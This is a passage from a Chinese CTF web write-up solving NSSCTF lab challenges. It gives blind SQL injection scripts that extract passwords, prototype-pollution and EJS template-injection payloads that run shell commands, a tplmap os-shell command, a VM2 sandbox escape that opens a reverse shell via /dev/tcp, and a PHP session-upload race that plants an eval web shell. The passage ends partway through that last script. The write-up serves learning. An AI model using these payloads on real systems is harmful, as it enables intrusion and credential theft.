class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">strrev</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"comment\">/*1||if(1,sleep(5),1)#</span></span><br><span class=\"line\"><span class=\"comment\">判断出单引号闭合</span></span><br><span class=\"line\"><span class=\"comment\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>过滤了 +, 空格，=,<br>\n 注释用 #,= 用 like, 空格用 <code>/**/</code>  时间盲注脚本改下参数即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">import</span> datetime  </span><br><span class=\"line\">  </span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>  </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">100</span>):  <span class=\"comment\">#这里其实是33到100,注意i是截取的范围</span></span><br><span class=\"line\">low = <span class=\"number\">32</span>  </span><br><span class=\"line\">high = <span class=\"number\">130</span>  </span><br><span class=\"line\">mid = (high + low) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (low &lt; high):  </span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/DATABASE()/**/AND/**/table_name/**/like/**/&#x27;user&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;  </span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1&#x27;||if((ascii(substr((SELECT/**/group_concat(&#x27;username&#x27;,&#x27;^&#x27;,password)/**/from/**/users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\">payload = payload.<span class=\"built_in\">format</span>(i, mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)  </span><br><span class=\"line\">payload = base64.b64encode(payload[::-<span class=\"number\">1</span>].encode(<span class=\"string\">&quot;utf-8&quot;</span>))  </span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>:payload,  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>:<span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">time1 = datetime.datetime.now()  </span><br><span class=\"line\">r = requests.post(url, data)  </span><br><span class=\"line\">time2 = datetime.datetime.now()  </span><br><span class=\"line\">time = (time2 - time1).seconds  </span><br><span class=\"line\"><span class=\"keyword\">if</span> time &gt; <span class=\"number\">1</span>:  </span><br><span class=\"line\">low = mid + <span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">high = mid  </span><br><span class=\"line\">mid = (low + high) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (mid == <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid == <span class=\"number\">130</span>):  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\">flag += <span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>假如我们知道成功时会返回 success, 那么此题还可以用布尔盲注 (时间更快，优先考虑)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"comment\">#请求网络界面就要调用  </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sql</span>(<span class=\"params\">url</span>):  </span><br><span class=\"line\">flag=<span class=\"string\">&#x27;&#x27;</span>  </span><br><span class=\"line\"><span class=\"comment\">#pay=&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;#&quot;  </span></span><br><span class=\"line\">pay=<span class=\"string\">&quot;1&#x27;/**/or/**/ascii(substr((SELECT/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span><span class=\"comment\">#根据实际情况更改  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>,<span class=\"number\">100</span>):<span class=\"comment\">#这里的i就是可显示字符的范围  </span></span><br><span class=\"line\">left = <span class=\"number\">32</span>  </span><br><span class=\"line\">right = <span class=\"number\">126</span>  </span><br><span class=\"line\">mid = (left + right) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">while</span> (left&lt;right):  </span><br><span class=\"line\">payload = pay.<span class=\"built_in\">format</span>(i, mid) <span class=\"comment\"># 这两个参数分别放到中括号  </span></span><br><span class=\"line\">data = &#123;  </span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span>: base64.b64encode(payload[::-<span class=\"number\">1</span>].encode()),  </span><br><span class=\"line\"><span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;1&#x27;</span>  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">r = requests.post(url, data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;success&#x27;</span> <span class=\"keyword\">in</span> r.text:<span class=\"comment\">#这里的success就是正确返回的内容  </span></span><br><span class=\"line\">left=mid+<span class=\"number\">1</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\">right=mid  </span><br><span class=\"line\">mid=(left+right)//<span class=\"number\">2</span>  </span><br><span class=\"line\">flag+=<span class=\"built_in\">chr</span>(mid)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:  </span><br><span class=\"line\">sql(<span class=\"string\">&#x27;http://node1.anna.nssctf.cn:28802/&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"27hgame-2023-week1guess-who-i-am\"><a class=\"markdownIt-Anchor\" href=\"#27hgame-2023-week1guess-who-i-am\">#</a> 27.[HGAME 2023 week1]Guess Who I Am</h3>\n<p>此题源代码有提示一个:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BvdGF0MDAwMC9WaWRhci1XZWJzaXRlL2Jsb2IvbWFzdGVyL3NyYy9zY3JpcHRzL2NvbmZpZy9tZW1iZXIuanM=\"> 网址</span><br>\n不难看出此题要求根据内容找到成员名字提交正确 100 次即可，但是那些特征却不在源代码中。因为那是 js 动态生成的<br>\n思路：爬取标签内容 -&gt; 找到 json 数据中对应的成员 -&gt; 提交给网页<br>\n<a href=\"\">爬取 js 动态数据可以看这篇</a><br>\n exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">host = <span class=\"string\">&quot;http://node2.anna.nssctf.cn:28018/&quot;</span>  </span><br><span class=\"line\">getQ = host + <span class=\"string\">&quot;api/getQuestion&quot;</span>  </span><br><span class=\"line\">getS = host + <span class=\"string\">&quot;api/getScore&quot;</span>  </span><br><span class=\"line\">postA = host + <span class=\"string\">&quot;api/verifyAnswer&quot;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># 打开文本,这里是从HINT给的那个网站上复制下来的，然后做了手工处理方便后续代码执行，  </span></span><br><span class=\"line\"><span class=\"comment\">#一是把最外层的方括号和那串字符去掉了，二是把最后一个花括号去掉了，三是把avatar的值有require的把他处理成双引号包含的字符，因为字典没有长这样的  </span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;C:\\Users\\30779\\Desktop\\1.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">data = f.read() <span class=\"comment\"># 读取文本  </span></span><br><span class=\"line\">members = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, data.split(<span class=\"string\">&#x27;&#125;,&#x27;</span>)))  </span><br><span class=\"line\">  </span><br><span class=\"line\">session = requests.session() <span class=\"comment\"># 保持会话，避免每次请求Cookie不同  </span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">101</span>):  </span><br><span class=\"line\">Q = json.loads(session.get(getQ).text)[<span class=\"string\">&#x27;message&#x27;</span>] <span class=\"comment\"># 将获取到的json数据转换成字典  </span></span><br><span class=\"line\">S = json.loads(session.get(getS).text)[<span class=\"string\">&#x27;message&#x27;</span>]  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;您要回答的问题 &#x27;</span>+Q)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;您现在的分数为 &#x27;</span>+<span class=\"built_in\">str</span>(S))  </span><br><span class=\"line\"><span class=\"keyword\">for</span> member <span class=\"keyword\">in</span> members:  </span><br><span class=\"line\">member += <span class=\"string\">&#x27;&#125;&#x27;</span>  </span><br><span class=\"line\">dic = json.loads(member)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> dic[<span class=\"string\">&#x27;intro&#x27;</span>] == Q:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;恭喜你找到了 &#x27;</span>+dic[<span class=\"string\">&#x27;id&#x27;</span>])  </span><br><span class=\"line\">session.post(postA, data=&#123;<span class=\"string\">&#x27;id&#x27;</span>: dic[<span class=\"string\">&#x27;id&#x27;</span>]&#125;)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"28hgame-2023-week4shared-diary\"><a class=\"markdownIt-Anchor\" href=\"#28hgame-2023-week4shared-diary\">#</a> 28.[HGAME 2023 week4]Shared Diary</h3>\n<p>考点：原型链污染和 ejs 模板 ssti<br>\n<a href=\"\"> 原型链污染可以看这篇</a><br>\n burp 抓包，改 Content-Type 为 application/json 用来发 json 数据<br>\n附件的源代码有 merge 函数导致原型链，过滤了 <code>__proto__</code> 要用 constructor.prototype 来绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>或者:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>这段 payload 先定义 constructor 的构造方法，利用原型对象 prototype 定义一个属性 role 值为 admin,<br>\n 然后 response 会显示一个<mark> Set-Cookie</mark> 的 session 值，告诉你这是 302 重定向用的，路径是 /<br>\n 因此我们就可以利用这个 session 登录 (username 和 password 都是 admin), 注意<mark>此时要修改路径为 /, 否则登不进去</mark></p>\n<p>进入后是一个 ejs 模板注入<br>\n <code>&#123;%-code%&#125;</code>  标签可以执行 js 代码，此题无过滤<br>\n步骤跟之前一样，改 session,<mark> 换路径为 /</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure>\n<p>payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%- process.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;).toString() %&gt;</span><br></pre></td></tr></table></figure>\n<p>tplmap</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python tplmap.py -u http://node2.anna.nssctf.cn:28131/ -d diary=1 -c session=s%3AevnNci_FQ3mbuQ53FJAkHIG1q_3Cmzf7.7MN5h%2F6huxvKTZFAUDFvPi%2FS0s8i53HTpqqutPLTp1U -e ejs --os-shell</span><br></pre></td></tr></table></figure>\n<h3 id=\"29hznuctf-2023-finaleznode\"><a class=\"markdownIt-Anchor\" href=\"#29hznuctf-2023-finaleznode\">#</a> 29.[HZNUCTF 2023 final]eznode</h3>\n<p>此题要学习 VM2 和 VM2 沙箱逃逸，可以看看这篇<a href=\"\"> VM 沙箱逃逸</a><br>\n app.js 看源码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"variable constant_\">VM</span> &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;vm2&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(express.<span class=\"title function_\">json</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> backdoor = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title function_\">VM</span>().<span class=\"title function_\">run</span>(&#123;&#125;.<span class=\"property\">shellcode</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class=\"property\">constructor</span> &amp;&amp; obj.<span class=\"property\">constructor</span> === <span class=\"title class_\">Object</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">merge</span> = (<span class=\"params\">a, b</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> attr <span class=\"keyword\">in</span> b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_\">isObject</span>(a[attr]) &amp;&amp; <span class=\"title function_\">isObject</span>(b[attr])) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">merge</span>(a[attr], b[attr]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            a[attr] = b[attr];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">clone</span> = (<span class=\"params\">a</span>) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">merge</span>(&#123;&#125;, a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(req.<span class=\"property\">body</span>)</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(req.<span class=\"property\">body</span>));</span><br><span class=\"line\">        <span class=\"keyword\">var</span> copybody = <span class=\"title function_\">clone</span>(body)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (copybody.<span class=\"property\">shit</span>) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">backdoor</span>()</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;post shit ok&quot;</span>)</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">send</span>(<span class=\"string\">&quot;is it shit ?&quot;</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(e)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">3000</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>有 merge 原型链污染，vm2 沙箱逃逸，backdoor 方法 <code>new VM().run(&#123;&#125;.shellcode);</code>  可以利用原型链污染到 shellcode，进而 rce</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> res = <span class=\"keyword\">import</span>(<span class=\"string\">&#x27;./foo.js&#x27;</span>)</span><br><span class=\"line\">res.<span class=\"property\">toString</span>.<span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"string\">&quot;return this&quot;</span></span>)(<span class=\"params\"></span>).<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"built_in\">require</span>(<span class=\"string\">&quot;child_process&quot;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&quot;whoami&quot;</span>).<span class=\"title function_\">toString</span>();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\\&quot;return this\\&quot;) ().process.mainModule.require(\\&quot;child_process\\&quot;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\&quot;&#x27;).toString();&quot;&#125;&#125; </span><br></pre></td></tr></table></figure>\n<p>注意这里反弹 shell 要有公网 ip, 先在自己的 vps 上 nc -lvp port<br>\n![[Pasted image 20230511202706.png]]</p>\n<h3 id=\"30第五空间-2021easycleanup\"><a class=\"markdownIt-Anchor\" href=\"#30第五空间-2021easycleanup\">#</a> 30.[第五空间 2021] EasyCleanup</h3>\n<p>本题考点：利用 session.upload_progress 进行文件包含，<a href=\"\"> 详解看这里</a><br>\n fuzz:<br>\nmode=eval&amp;shell=system (‘ls /’); 看根目录的所有文件名，发现 nssctfasdasdflag, 但是 shell 的长度不能超过 15 或者传 file 包含但是长度也不能超过 15, 而 nssctfasdasdflag 的长度是 16</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> threading  </span><br><span class=\"line\">sessid = <span class=\"string\">&#x27;TGAO&#x27;</span>  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;cmd&quot;</span>:<span class=\"string\">&quot;system(&#x27;cat /nssctfasdasdflag&#x27;);&quot;</span>&#125; <span class=\"comment\">#此处可以执行任何系统命令 </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">f = io.BytesIO(<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>)  </span><br><span class=\"line\">resp = session.post( <span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/&#x27;</span>, data=&#123;<span class=\"string\">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class=\"string\">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class=\"string\">&#x27;file&#x27;</span>: (<span class=\"string\">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">resp = session.post(<span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28832/?file=/tmp/sess_&#x27;</span>+sessid,data=data)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;tgao.txt&#x27;</span> <span class=\"keyword\">in</span> resp.text:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp.text)  </span><br><span class=\"line\">event.clear()  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:  </span><br><span class=\"line\">event=threading.Event()  </span><br><span class=\"line\"><span class=\"keyword\">with</span> requests.session() <span class=\"keyword\">as</span> session:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span class=\"line\">threading.Thread(target=write,args=(session,)).start()  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>):  </span><br><span 